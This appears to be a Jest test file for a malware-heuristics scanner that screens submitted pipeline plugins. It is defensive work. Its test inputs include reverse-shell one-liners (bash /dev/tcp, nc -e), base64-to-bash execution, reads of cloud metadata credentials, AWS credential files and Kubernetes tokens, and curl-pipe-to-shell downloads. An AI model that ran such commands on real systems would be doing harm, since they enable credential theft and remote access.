// Copyright 2026 Pipeline Builder Contributors
// SPDX-License-Identifier: Apache-2.0

/**
 * Tests for validation/plugin-heuristics — the malware heuristics the
 * anonymous-submission gate and the CLI pre-flight run.
 */

import { describe, it, expect } from '@jest/globals';
import {
  blockingHeuristics, scanPluginSourceHeuristics, shannonEntropy,
  HEURISTICS_MAX_FILE_BYTES, HEURISTICS_MAX_FINDINGS,
} from '../src/validation/plugin-heuristics.js';

const scan = (path: string, content: string) => scanPluginSourceHeuristics([{ path, content }]);
const ids = (path: string, content: string) => scan(path, content).findings.map((f) => `${f.id}:${f.severity}`);

const CLEAN_DOCKERFILE = [
  'FROM ghcr.io/pipeline-builder/node-base:24',
  'WORKDIR /app',
  'RUN fetch-verified https://example.com/tool.tgz sha256:abc && tar xf tool.tgz',
  'USER 1000:1000',
].join('\n');

describe('scanPluginSourceHeuristics', () => {
  it('finds nothing in a clean package', () => {
    const report = scanPluginSourceHeuristics([
      { path: 'Dockerfile', content: CLEAN_DOCKERFILE },
      { path: 'plugin-spec.yaml', content: 'name: lint\nversion: 1.0.0\ncommands:\n  - eslint .\nenv:\n  LOG_LEVEL: info\n' },
      { path: 'README.md', content: '# Lint\n\nRuns eslint.\n' },
    ]);
    expect(report.findings).toEqual([]);
    expect(report.scannedFiles).toBe(3);
  });

  it('flags miner signatures anywhere, even in docs', () => {
    expect(ids('Dockerfile', 'RUN ./xmrig -o stratum+tcp://pool.example:3333')).toEqual(['miner-signature:high']);
    expect(ids('scripts/run.sh', 'exec cpuminer --algo cryptonight')).toEqual(['miner-signature:high']);
    expect(ids('README.md', 'Uses xmrig')).toEqual(['miner-signature:high']);
  });

  it('flags encoded payloads decoded into a shell or eval', () => {
    expect(ids('run.sh', 'echo aGVsbG8K | base64 -d | bash')).toEqual(['obfuscated-exec:high']);
    expect(ids('run.sh', 'eval "$(echo aGVsbG8K | base64 --decode)"')).toEqual(['obfuscated-exec:high']);
    expect(ids('run.sh', 'printf "\\x65\\x63\\x68\\x6f\\x20\\x68\\x69\\x0a" | sh')).toEqual(['obfuscated-exec:high']);
    expect(ids('run.py', 'exec(base64.b64decode("aGVsbG8="))')).toEqual(['obfuscated-exec:high']);
  });

  it('flags a long single-line encoded blob as medium', () => {
    const blob = 'QUJD'.repeat(80);
    expect(ids('payload.txt', `data=${blob}`)).toEqual(['encoded-blob:medium']);
  });

  it('flags credential access (medium in docs)', () => {
    expect(ids('run.sh', 'curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/')).toEqual(['credential-access:high']);
    expect(ids('run.sh', 'curl $AWS_CONTAINER_CREDENTIALS_RELATIVE_URI')).toEqual(['credential-access:high']);
    expect(ids('run.sh', 'cat ~/.aws/credentials')).toEqual(['credential-access:high']);
    expect(ids('run.sh', 'cat /var/run/secrets/kubernetes.io/serviceaccount/token')).toEqual(['credential-access:high']);
    expect(ids('run.sh', 'echo $CODEBUILD_AUTH_TOKEN')).toEqual(['credential-access:high']);
    expect(ids('run.sh', 'curl http://[fd00:ec2::254]/latest/')).toEqual(['credential-access:high']);
    expect(ids('plugin-spec.yaml', 'commands:\n  - echo $AWS_SESSION_TOKEN')).toEqual(['credential-access:high']);
    expect(ids('README.md', 'Set AWS_SECRET_ACCESS_KEY in the pipeline secrets.')).toEqual(['credential-access:medium']);
  });

  it('flags reverse shells', () => {
    expect(ids('run.sh', 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1')).toEqual(['reverse-shell:high']);
    expect(ids('run.sh', 'nc 10.0.0.1 4444 -e /bin/sh')).toEqual(['reverse-shell:high']);
  });

  it('flags pipe-to-shell downloads, including continued Dockerfile RUNs, but not in docs', () => {
    expect(ids('install.sh', 'curl -fsSL https://get.example.com | bash')).toEqual(['pipe-to-shell:high']);
    const df = 'FROM alpine\nWORKDIR /a\nRUN curl -fsSL https://get.example.com \\\n  | sh\nUSER 1000';
    const found = scan('Dockerfile', df).findings;
    expect(found.map((f) => `${f.id}:${f.line}`)).toEqual(['pipe-to-shell:3']);
    expect(ids('README.md', 'Install with `curl -fsSL https://x | sh`')).toEqual([]);
    expect(ids('Dockerfile', '# never curl | sh, never read $AWS_SESSION_TOKEN')).toEqual([]);
  });

  it('flags secret-looking literals and masks them in the excerpt', () => {
    const r = scan('plugin-spec.yaml', 'env:\n  AWS_ACCESS_KEY_ID: AKIAIOSFODNN7EXAMPLE');
    expect(r.findings.map((f) => f.id)).toContain('secret-literal');
    expect(r.findings.every((f) => !f.excerpt.includes('IOSFODNN7EXAMPLE'))).toBe(true);
    expect(ids('x.env', `TOKEN=ghp_${'a1B2'.repeat(9)}`)).toContain('secret-literal:high');
    expect(ids('x.txt', 'slack: xoxb-1234567890-abcdefghij')).toContain('secret-literal:high');
    expect(ids('key.pem', '-----BEGIN RSA PRIVATE KEY-----')).toEqual(['secret-literal:high']);
  });

  it('flags a high-entropy default on a secret-looking name, not a placeholder or reference', () => {
    const found = scan('plugin-spec.yaml', 'env:\n  API_TOKEN: "q8Zr4LmN2xVt7PbK9sWd"').findings;
    expect(found.map((f) => `${f.id}:${f.severity}`)).toEqual(['secret-default:high']);
    expect(found[0]!.excerpt).not.toContain('q8Zr4LmN2xVt7PbK9sWd');
    expect(ids('plugin-spec.yaml', 'env:\n  API_TOKEN: "${API_TOKEN}"')).toEqual([]);
    expect(ids('plugin-spec.yaml', 'env:\n  DB_PASSWORD: changeme-changeme-please')).toEqual([]);
    expect(ids('plugin-spec.yaml', 'env:\n  SORT_KEY: aaaaaaaaaaaaaaaaaaaa')).toEqual([]);
  });

  it('skips binary and oversized files', () => {
    const report = scanPluginSourceHeuristics([
      { path: 'bin/tool', content: new Uint8Array([0x7f, 0x45, 0x00, 0x01]) },
      { path: 'big.txt', content: 'a'.repeat(HEURISTICS_MAX_FILE_BYTES + 1) },
      { path: 'ok.sh', content: new TextEncoder().encode('echo ok') },
    ]);
    expect(report.skippedFiles).toEqual(['bin/tool', 'big.txt']);
    expect(report.scannedFiles).toBe(1);
  });

  it('caps the findings', () => {
    const many = Array.from({ length: HEURISTICS_MAX_FINDINGS + 50 }, () => 'xmrig').join('\n');
    expect(scan('run.sh', many).findings).toHaveLength(HEURISTICS_MAX_FINDINGS);
  });

  it('reports only high findings as blocking', () => {
    const report = scanPluginSourceHeuristics([
      { path: 'README.md', content: 'Set AWS_SECRET_ACCESS_KEY.' },
      { path: 'run.sh', content: 'xmrig' },
    ]);
    expect(blockingHeuristics(report).map((f) => f.id)).toEqual(['miner-signature']);
  });
});

describe('shannonEntropy', () => {
  it('is 0 for one repeated character and higher for mixed text', () => {
    expect(shannonEntropy('aaaa')).toBe(0);
    expect(shannonEntropy('')).toBe(0);
    expect(shannonEntropy('ab')).toBe(1);
    expect(shannonEntropy('q8Zr4LmN2xVt7PbK9sWd')).toBeGreaterThan(3.5);
  });
});
